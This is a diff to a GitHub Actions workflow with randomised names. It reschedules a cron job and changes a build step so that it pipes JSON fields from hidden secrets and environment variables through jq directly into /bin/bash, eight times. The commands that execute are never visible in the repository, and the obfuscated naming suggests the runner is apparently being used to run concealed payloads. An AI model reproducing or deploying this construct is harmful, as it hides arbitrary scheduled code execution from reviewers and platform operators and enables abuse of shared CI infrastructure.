@@ -1,23 +1,24 @@
 name: zhaozilong7182
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 2/6 * * *'
+    - cron: '3 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhaozilong7182
         env:
-          tqyvo77: ${{ secrets.tqyvo77 }}
+          ilj8616: ${{ secrets.ilj8616 }}
         run: |
-          echo $tqyvo77 | jq -r .uj088 | /bin/bash
-          echo $e3 | jq -r .ia638 | /bin/bash
-          echo $jgou2894 | jq -r .geylp33 | /bin/bash
-          echo $ll51 | jq -r .xho0 | /bin/bash
-          echo $ehmi6745 | jq -r .cqu24 | /bin/bash
-          echo $msf880 | jq -r .ft9059 | /bin/bash
-          echo $qwz5436 | jq -r .xh58773 | /bin/bash
+          echo $ilj8616 | jq -r .iyk6847 | /bin/bash
+          echo $s5 | jq -r .nmf69859 | /bin/bash
+          echo $cpq53341 | jq -r .ankwq484 | /bin/bash
+          echo $yxqht29 | jq -r .hf557 | /bin/bash
+          echo $yzgn45 | jq -r .mvx1 | /bin/bash
+          echo $stdsv1 | jq -r .mw8171 | /bin/bash
+          echo $ej36 | jq -r .ujrql0650 | /bin/bash
+          echo $exbl01037 | jq -r .ci784 | /bin/bash
 
